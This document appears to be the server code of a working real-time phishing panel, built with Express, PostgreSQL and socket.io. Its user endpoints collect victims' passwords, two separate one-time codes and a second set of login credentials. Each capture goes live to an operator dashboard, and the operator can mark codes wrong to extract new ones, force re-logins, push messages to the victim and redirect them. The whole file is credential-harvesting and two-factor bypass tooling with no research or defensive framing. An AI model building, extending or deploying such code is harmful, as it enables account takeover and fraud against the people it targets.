require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(publicPath, 'users/otp.html')));
app.get('/users/second-otp', (req, res) => res.sendFile(path.join(publicPath, 'users/second-otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(publicPath, 'users/success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(publicPath, 'admin/index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(publicPath, 'admin/dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
  connectionTimeoutMillis: 30000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true,
  family: 4
});

pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to Neon PostgreSQL database');
    release();
  }
});

const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) {
    socket.isUser = true;
    return next();
  }
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return next(new Error('Authentication error'));
    socket.user = user;
    socket.isAdmin = true;
    next();
  });
});

io.on('connection', (socket) => {
  if (socket.isAdmin) {
    console.log('👑 Admin connected:', socket.user?.email, socket.id);
  } else {
    console.log('👤 User connected:', socket.id);
    socket.on('identify', (data) => {
      socket.userEmail = data.email;
      console.log('👤 User identified:', data.email);
    });
  }
  socket.emit('test-notification', { message: 'Connected to real-time server', timestamp: new Date() });
  socket.on('disconnect', () => {
    if (socket.isAdmin) console.log('👑 Admin disconnected:', socket.id);
    else console.log('👤 User disconnected:', socket.id);
  });
});

async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(6),
        second_otp VARCHAR(6) DEFAULT NULL,
        otp_attempts INTEGER DEFAULT 0,
        otp_verified BOOLEAN DEFAULT FALSE,
        approved BOOLEAN DEFAULT FALSE,
        second_approved BOOLEAN DEFAULT FALSE,
        force_login BOOLEAN DEFAULT FALSE,
        redirect_success BOOLEAN DEFAULT FALSE,
        login_email VARCHAR(255) DEFAULT NULL,
        login_password VARCHAR(255) DEFAULT NULL,
        admin_text TEXT DEFAULT NULL,
        text_release BOOLEAN DEFAULT FALSE,
        email_submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        first_otp_submitted_at TIMESTAMP,
        second_otp_submitted_at TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        reset_otp_flag BOOLEAN DEFAULT FALSE
      )
    `);
    console.log('✅ Users table ready');

    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    await pool.query(`
      CREATE TABLE IF NOT EXISTS blocked_emails (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        blocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        blocked_by VARCHAR(255)
      )
    `);
    console.log('✅ Blocked emails table ready');

    await pool.query(`
      ALTER TABLE users 
      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS force_login BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS redirect_success BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS login_email VARCHAR(255) DEFAULT NULL,
      ADD COLUMN IF NOT EXISTS login_password VARCHAR(255) DEFAULT NULL,
      ADD COLUMN IF NOT EXISTS admin_text TEXT DEFAULT NULL,
      ADD COLUMN IF NOT EXISTS text_release BOOLEAN DEFAULT FALSE,
      ADD COLUMN IF NOT EXISTS email_submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      ADD COLUMN IF NOT EXISTS first_otp_submitted_at TIMESTAMP,
      ADD COLUMN IF NOT EXISTS second_otp_submitted_at TIMESTAMP,
      ADD COLUMN IF NOT EXISTS reset_otp_flag BOOLEAN DEFAULT FALSE
    `).catch(() => console.log('✅ Additional columns exist'));

    await pool.query(`
      CREATE OR REPLACE FUNCTION update_updated_at_column()
      RETURNS TRIGGER AS $$
      BEGIN
          NEW.updated_at = CURRENT_TIMESTAMP;
          RETURN NEW;
      END;
      $$ language 'plpgsql';
    `);

    await pool.query(`
      DROP TRIGGER IF EXISTS update_users_updated_at ON users;
      CREATE TRIGGER update_users_updated_at
          BEFORE UPDATE ON users
          FOR EACH ROW
          EXECUTE FUNCTION update_updated_at_column();
    `);

    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    console.log('✅ Database initialization completed');
    return true;
  } catch (error) {
    console.error('❌ Database init error:', error.message);
    return false;
  }
}

async function isEmailBlocked(email) {
  const result = await pool.query('SELECT * FROM blocked_emails WHERE LOWER(email) = LOWER($1)', [email]);
  return result.rows.length > 0;
}

// ==================== USER ENDPOINTS ====================

app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const blocked = await isEmailBlocked(email);
    if (blocked) return res.json({ blocked: true, message: 'Email is blocked' });

    await pool.query(`
      INSERT INTO users (email, password, otp_verified, approved, second_approved, email_submitted_at, reset_otp_flag) 
      VALUES ($1, $2, false, false, false, CURRENT_TIMESTAMP, false) 
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false, email_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false
    `, [email, password]);

    console.log('🔔 New login:', email);
    io.emit('user-login', { email, password, timestamp: new Date() });
    res.json({ success: true, message: 'Email submitted for approval' });
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/users/check-blocked', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ blocked: false });
    const blocked = await isEmailBlocked(email);
    res.json({ blocked });
  } catch (error) {
    res.json({ blocked: false });
  }
});

app.post('/api/users/check-reset-flag', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ reset: false });
    const result = await pool.query('SELECT reset_otp_flag FROM users WHERE email = $1', [email]);
    const reset = result.rows.length > 0 ? result.rows[0].reset_otp_flag : false;
    if (reset) await pool.query('UPDATE users SET reset_otp_flag = false WHERE email = $1', [email]);
    res.json({ reset });
  } catch (error) {
    res.json({ reset: false });
  }
});

app.post('/api/users/check-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
  } catch (error) {
    res.json({ approved: false });
  }
});

app.post('/api/users/check-first-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
  } catch (error) {
    res.json({ approved: false });
  }
});

app.post('/api/users/check-second-approval', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ approved: false });
    const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
    res.json({ approved: result.rows.length > 0 ? result.rows[0].second_approved : false });
  } catch (error) {
    res.json({ approved: false });
  }
});

app.post('/api/users/submit-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
    
    await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false, first_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2', [otp, email]);
    io.emit('user-otp-created', { email, otp, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/users/submit-second-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
    if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
    
    const userResult = await pool.query('SELECT otp FROM users WHERE email = $1', [email]);
    const firstOtp = userResult.rows[0]?.otp;
    
    if (firstOtp && firstOtp === otp) {
      io.emit('duplicate-otp-attempt', { email, otp, timestamp: new Date() });
      return res.status(400).json({ error: '❌ You cannot use the same code as your first verification. Please enter a different code.' });
    }
    
    await pool.query('UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2', [otp, email]);
    io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit second OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== POLLING ENDPOINTS ====================

app.post('/api/users/check-force-login', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ force_login: false });
    const result = await pool.query('SELECT force_login FROM users WHERE email = $1', [email]);
    res.json({ force_login: result.rows.length > 0 ? result.rows[0].force_login : false });
  } catch (error) {
    res.json({ force_login: false });
  }
});

app.post('/api/users/check-redirect-success', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ redirect_success: false });
    const result = await pool.query('SELECT redirect_success FROM users WHERE email = $1', [email]);
    res.json({ redirect_success: result.rows.length > 0 ? result.rows[0].redirect_success : false });
  } catch (error) {
    res.json({ redirect_success: false });
  }
});

app.post('/api/users/check-admin-text', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.json({ admin_text: null, text_release: false });
    const result = await pool.query('SELECT admin_text, text_release FROM users WHERE email = $1', [email]);
    if (result.rows.length === 0) return res.json({ admin_text: null, text_release: false });
    res.json({ admin_text: result.rows[0].admin_text, text_release: result.rows[0].text_release });
  } catch (error) {
    res.json({ admin_text: null, text_release: false });
  }
});

app.post('/api/users/submit-login-popup', async (req, res) => {
  try {
    const { email, loginEmail, loginPassword } = req.body;
    if (!email || !loginEmail || !loginPassword) return res.status(400).json({ error: 'All fields required' });
    
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) return res.status(400).json({ error: 'Please enter a valid email address' });
    
    await pool.query('UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3', [loginEmail, loginPassword, email]);
    io.emit('user-login-submitted', { email, loginEmail, loginPassword, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Submit login popup error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== ADMIN ENDPOINTS ====================

app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
    const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
    const token = jwt.sign({ id: result.rows[0].id, email, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT id, email, password, otp, second_otp, otp_attempts, otp_verified, approved, second_approved,
             force_login, redirect_success, login_email, login_password,
             email_submitted_at, first_otp_submitted_at, second_otp_submitted_at, created_at, updated_at
      FROM users ORDER BY created_at DESC
    `);
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Admin users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/admin/blocked-emails', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM blocked_emails ORDER BY blocked_at DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/block-email', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await pool.query('INSERT INTO blocked_emails (email, blocked_by) VALUES ($1, $2) ON CONFLICT (email) DO NOTHING', [email, req.user.email]);
    await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
    io.emit('user-blocked', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Block email error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/unblock-email', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    const userExists = await pool.query('SELECT id FROM users WHERE LOWER(email) = LOWER($1)', [email]);
    if (userExists.rows.length > 0) {
      await pool.query(`
        UPDATE users SET 
          password = 'user', otp = NULL, second_otp = NULL, otp_attempts = 0, otp_verified = false,
          approved = false, second_approved = false, force_login = false, redirect_success = false,
          login_email = NULL, login_password = NULL,
          email_submitted_at = NULL, first_otp_submitted_at = NULL, second_otp_submitted_at = NULL,
          created_at = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP,
          reset_otp_flag = false
        WHERE LOWER(email) = LOWER($1)
      `, [email]);
    }
    await pool.query('DELETE FROM blocked_emails WHERE LOWER(email) = LOWER($1)', [email]);
    io.emit('user-unblocked', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Unblock email error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// SINGLE APPROVE BUTTON - Approves email or first OTP based on current state
app.post('/api/admin/approve', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    const user = await pool.query('SELECT approved, otp, second_approved FROM users WHERE email = $1', [email]);
    if (user.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    
    const userData = user.rows[0];
    
    if (!userData.approved) {
      await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
      console.log('✅ Email approved for:', email);
    } else if (userData.approved && userData.otp && !userData.second_approved) {
      await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
      console.log('✅ First OTP approved for:', email);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Approve error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await pool.query('UPDATE users SET force_login = true WHERE email = $1', [email]);
    io.emit('force-login-triggered', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Force login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
    io.emit('redirect-success-triggered', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Redirect success error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/send-text', authenticateJWT, async (req, res) => {
  try {
    const { email, text } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    if (!text || text.trim() === '') return res.status(400).json({ error: 'Text message required' });
    await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', [text.trim(), email]);
    io.emit('text-sent', { email, text, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Send text error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await pool.query('UPDATE users SET text_release = true, admin_text = NULL WHERE email = $1', [email]);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Release text error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// INCORRECT OTP - Resets OTP in database, shows error message once
app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    // RESET OTP in database (clear it so user must submit new one)
    await pool.query(`
      UPDATE users SET 
        otp = NULL,
        approved = false,
        admin_text = 'incorrect_otp_error',
        text_release = false
      WHERE email = $1
    `, [email]);
    
    console.log('🔴 Admin marked OTP as incorrect - OTP reset for user:', email);
    
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Incorrect OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// WRONG LOGIN - Shows error, clears password, keeps modal open
app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    await pool.query(`
      UPDATE users SET 
        admin_text = 'wrong_login_error',
        text_release = false
      WHERE email = $1
    `, [email]);
    
    console.log('❌ Admin marked login as WRONG for user:', email);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Wrong login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// CORRECT LOGIN - Shows loading spinner inside modal
app.post('/api/admin/correct-login', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    await pool.query(`
      UPDATE users SET 
        admin_text = 'correct_login_success',
        text_release = false,
        force_login = false
      WHERE email = $1
    `, [email]);
    
    console.log('✅ Admin marked login as CORRECT for user:', email);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Correct login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/delete-user', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await pool.query('DELETE FROM users WHERE email = $1', [email]);
    io.emit('user-deleted', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ Delete user error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ==================== HEALTH CHECK ====================

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started!');
      console.log(`📡 Port: ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
    });
  } else {
    process.exit(1);
  }
});

process.on('SIGINT', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
